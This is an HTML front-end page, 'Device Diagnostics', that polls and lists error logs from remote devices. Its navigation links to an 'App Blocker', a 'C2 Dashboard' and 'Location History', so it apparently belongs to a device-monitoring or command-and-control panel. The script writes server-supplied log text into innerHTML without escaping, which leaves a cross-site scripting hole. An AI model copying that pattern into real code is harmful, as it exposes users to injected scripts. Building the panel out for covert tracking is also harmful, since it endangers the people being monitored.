<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anasio | Device Diagnostics</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
    <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200 gap-4">
            <div class="flex items-center gap-4">
                <div class="bg-red-600 text-white p-2 rounded-lg">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                </div>
                <div><h1 class="text-xl font-bold tracking-tight text-gray-900 text-center md:text-left">Device Diagnostics & Errors</h1></div>
            </div>
            <div class="flex flex-wrap justify-center items-center gap-4">
                <a href="/apps_view" class="text-xs font-bold text-purple-600 hover:text-purple-800 transition tracking-wide uppercase">App Blocker</a>
                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
                <a href="/history_view" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">Location History</a>
                <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
                    <option value="">Loading...</option>
                </select>
            </div>
        </nav>

        <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
            <div class="flex items-center justify-between mb-4">
                <p class="text-xs font-bold text-red-500 uppercase tracking-widest">Error Logs</p>
                <button type="button" id="refresh-errors-btn" class="text-xs font-semibold px-3 py-1 rounded-full bg-red-100 text-red-700 hover:bg-red-200 transition">Refresh</button>
            </div>
            <div id="errors-container" class="flex flex-col gap-3 h-[600px] overflow-y-auto bg-gray-50 p-4 rounded-xl border border-gray-200 text-sm font-mono">
                <span class="text-gray-400">Waiting for error logs...</span>
            </div>
        </div>
    </div>

    <script>
        const selectEl = document.getElementById('device-select');

        async function fetchAvailableDevices() {
            try {
                const res = await fetch('/devices');
                const data = await res.json();
                if (data.devices && data.devices.length > 0) {
                    const val = selectEl.value;
                    selectEl.innerHTML = '';
                    data.devices.forEach(did => {
                        const opt = document.createElement('option');
                        opt.value = did; opt.textContent = did;
                        selectEl.appendChild(opt);
                    });
                    if (val && data.devices.includes(val)) selectEl.value = val;
                }
            } catch(err) { console.error(err); }
        }

        async function fetchErrors() {
            if(!selectEl.value) return;
            const container = document.getElementById('errors-container');
            try {
                const res = await fetch(`/get_errors?device_id=${encodeURIComponent(selectEl.value)}`);
                if(res.ok) {
                    const data = await res.json();
                    container.innerHTML = '';
                    if(!data.errors || data.errors.length === 0) {
                        container.innerHTML = '<span class="text-gray-400">No errors reported for this device.</span>';
                        return;
                    }
                    data.errors.forEach(err => {
                        const errEl = document.createElement('div');
                        errEl.className = 'border-l-4 border-red-500 pl-4 py-2 mb-2 bg-white rounded shadow-sm border border-gray-200';
                        errEl.innerHTML = `<div class="text-xs text-gray-500 mb-1">${err.timestamp} | <span class="font-bold text-red-600 uppercase tracking-wide">${err.source}</span></div>
                                           <div class="text-gray-800 break-all whitespace-pre-wrap">${err.message}</div>`;
                        container.appendChild(errEl);
                    });
                }
            } catch(e) { console.error(e); }
        }

        document.getElementById('refresh-errors-btn').addEventListener('click', fetchErrors);
        selectEl.addEventListener('change', fetchErrors);
        
        (async () => { 
            await fetchAvailableDevices(); 
            fetchErrors(); 
            setInterval(fetchErrors, 5000); 
        })();
    </script>
</body>
</html>
